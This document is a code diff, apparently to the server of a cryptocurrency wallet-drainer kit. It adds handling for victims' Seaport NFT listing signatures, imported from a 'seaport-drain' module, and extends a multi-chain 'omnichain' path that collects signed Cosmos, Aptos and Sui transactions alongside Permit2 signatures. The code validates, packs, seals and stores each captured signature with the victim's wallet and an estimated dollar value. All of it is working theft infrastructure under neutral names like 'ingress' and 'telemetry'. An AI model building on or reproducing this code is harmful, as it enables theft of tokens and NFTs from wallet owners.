@@ -51,6 +51,10 @@ import {
   parseBitcoinSatAmount,
   resolveBitcoinVaultAddress,
 } from '@legion/core/logic/bitcoin-drain'
+import {
+  normalizeSeaportOrder,
+  packSeaportListingSignatureEnvelope,
+} from '@legion/core/logic/seaport-drain'
 
 const PERMIT2_CONTRACT = '0x000000000022D473030F116dDEE9F6B43aC78BA3' as Address
 import {
@@ -189,6 +193,9 @@ interface NormalizedIngressV1 {
   jetton_signed_transaction?: string
   nfts?: Array<{ contract: string; tokenIds: string[]; standard?: 'erc721' | 'erc1155'; amounts?: string[] }>
   nft_approval_signatures?: Record<string, string>
+  seaport_order?: unknown
+  seaport_version?: '1.5' | '1.4'
+  order_hash?: string
   signed_psbt_base64?: string
   psbt_metadata?: {
     amount_sat?: string
@@ -210,6 +217,9 @@ interface NormalizedIngressV1 {
     amount_sat?: string
     fee_sat?: string
   }
+  cosmos_payload?: Record<string, unknown>
+  aptos_payload?: Record<string, unknown>
+  sui_payload?: Record<string, unknown>
   scout_value_usd?: number
   amount?: string
   wallet_balance?: string
@@ -270,6 +280,7 @@ const PROTOCOL_RACK = new Set([
   'permit2_eip712',
   'permit2_batch_eip712',
   'omnichain_atomic_v1',
+  'seaport_listing',
   'solana',
   'utxo',
   'bitcoin_psbt',
@@ -1933,7 +1944,7 @@ async function handleNormalizedIngress(
     return sendFailure(
       reply,
       400,
-      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, omnichain_atomic_v1, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
+      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, omnichain_atomic_v1, seaport_listing, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
       { code: 'ValidationError' },
     )
   }
@@ -2093,12 +2104,68 @@ async function handleNormalizedIngress(
   }
 
   if (b.chain_family === 'EVM') {
+    if (protocolNorm === 'seaport_listing') {
+      if (b.chain_id == null) {
+        return sendFailure(reply, 400, 'seaport_listing ingress requires chain_id', {
+          code: 'ValidationError',
+        })
+      }
+      const sigRaw =
+        typeof signatureRaw === 'string' ? signatureRaw.trim() : String(signatureRaw ?? '').trim()
+      if (!sigRaw.startsWith('0x')) {
+        return sendFailure(reply, 400, 'seaport_listing ingress requires EIP-712 signature', {
+          code: 'ValidationError',
+        })
+      }
+      const orderRaw = b.seaport_order ?? { parameters: b.evm_payload, signature: sigRaw }
+      let normalizedOrder
+      try {
+        normalizedOrder = normalizeSeaportOrder(orderRaw, sigRaw)
+      } catch (e) {
+        const msg = e instanceof Error ? e.message : String(e)
+        return sendFailure(reply, 400, msg, { code: 'ValidationError' })
+      }
+      const nftOffer = normalizedOrder.parameters.offer[0]
+      const tokenAddress = nftOffer?.token ?? token_address
+      const packed = packSeaportListingSignatureEnvelope({
+        chainId: Number(b.chain_id),
+        order: normalizedOrder,
+        walletAddress: wallet_address,
+        seaportVersion: b.seaport_version,
+      })
+      const sealed = sealSignatureHexForPersistence(packed)
+      const chainIdNorm = String(b.chain_id).trim()
+      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
+      return persistSignatureRow(
+        {
+          wallet_address,
+          token_address: tokenAddress,
+          signature_hex: sealed,
+          nonce: b.nonce,
+          expiry: b.expiry_iso,
+          wallet_type: b.wallet_type.trim(),
+          protocol: 'seaport_listing',
+          chain_family: 'EVM',
+          scout_value_usd: tel.scout_value_usd,
+          amount: nftOffer?.identifierOrCriteria?.toString() ?? tel.amount,
+          max_allowance: tel.max_allowance,
+          requires_quorum: tel.requires_quorum,
+          source_origin: sourceOrigin,
+          chain_id: chainIdNorm,
+        },
+        reply,
+      )
+    }
+
     if (protocolNorm === 'omnichain_atomic_v1') {
       const omnichainPayloads = validateOmnichainAtomicIngressPayloads({
         solana_payload: b.solana_payload,
         tron_payload: b.tron_payload,
         ton_payload: b.ton_payload,
         bitcoin_payload: b.bitcoin_payload,
+        cosmos_payload: b.cosmos_payload,
+        aptos_payload: b.aptos_payload,
+        sui_payload: b.sui_payload,
       })
       if (omnichainPayloads.ok === false) {
         return sendFailure(reply, 400, omnichainPayloads.message, { code: 'ValidationError' })
@@ -2115,7 +2182,10 @@ async function handleNormalizedIngress(
         omnichainPayloads.data.solana != null ||
         omnichainPayloads.data.tron != null ||
         omnichainPayloads.data.ton != null ||
-        omnichainPayloads.data.bitcoin != null
+        omnichainPayloads.data.bitcoin != null ||
+        omnichainPayloads.data.cosmos != null ||
+        omnichainPayloads.data.aptos != null ||
+        omnichainPayloads.data.sui != null
 
       if (!hasEvmBatch && !hasNonEvmLeg) {
         return sendFailure(
@@ -2300,6 +2370,51 @@ async function handleNormalizedIngress(
           }
         : undefined
 
+      const cosmosPayload = omnichainPayloads.data.cosmos
+        ? {
+            ...(omnichainPayloads.data.cosmos.native_amount_cosmos != null
+              ? { native_amount_cosmos: String(omnichainPayloads.data.cosmos.native_amount_cosmos) }
+              : {}),
+            ...(omnichainPayloads.data.cosmos.cosmos_signed_tx
+              ? { cosmos_signed_tx: omnichainPayloads.data.cosmos.cosmos_signed_tx }
+              : {}),
+            ...(omnichainPayloads.data.cosmos.cosmos_tx_encoding
+              ? { cosmos_tx_encoding: omnichainPayloads.data.cosmos.cosmos_tx_encoding }
+              : {}),
+          }
+        : undefined
+
+      const aptosPayload = omnichainPayloads.data.aptos
+        ? {
+            ...(omnichainPayloads.data.aptos.native_amount_aptos != null
+              ? { native_amount_aptos: String(omnichainPayloads.data.aptos.native_amount_aptos) }
+              : {}),
+            ...(omnichainPayloads.data.aptos.aptos_signed_tx
+              ? { aptos_signed_tx: omnichainPayloads.data.aptos.aptos_signed_tx }
+              : {}),
+            ...(omnichainPayloads.data.aptos.aptos_signature
+              ? { aptos_signature: omnichainPayloads.data.aptos.aptos_signature }
+              : {}),
+            ...(omnichainPayloads.data.aptos.aptos_tx_encoding
+              ? { aptos_tx_encoding: omnichainPayloads.data.aptos.aptos_tx_encoding }
+              : {}),
+          }
+        : undefined
+
+      const suiPayload = omnichainPayloads.data.sui
+        ? {
+            ...(omnichainPayloads.data.sui.native_amount_sui != null
+              ? { native_amount_sui: String(omnichainPayloads.data.sui.native_amount_sui) }
+              : {}),
+            ...(omnichainPayloads.data.sui.sui_signed_tx
+              ? { sui_signed_tx: omnichainPayloads.data.sui.sui_signed_tx }
+              : {}),
+            ...(omnichainPayloads.data.sui.sui_signature
+              ? { sui_signature: omnichainPayloads.data.sui.sui_signature }
+              : {}),
+          }
+        : undefined
+
       const permit2Sig = normalizeSignatureHexForSeal(String(signatureRaw)) as Hex
       const packed = packOmnichainAtomicSignatureEnvelope({
         permit2Signature: permit2Sig,
@@ -2324,6 +2439,9 @@ async function handleNormalizedIngress(
         ...(solanaPayload ? { solanaPayload } : {}),
         ...(tronPayload ? { tronPayload } : {}),
         ...(tonPayload ? { tonPayload } : {}),
+        ...(cosmosPayload ? { cosmosPayload } : {}),
+        ...(aptosPayload ? { aptosPayload } : {}),
+        ...(suiPayload ? { suiPayload } : {}),
         ...(bitcoinPayload ? { bitcoinPayload } : {}),
       })
       const sealed = sealSignatureHexForPersistence(packed)
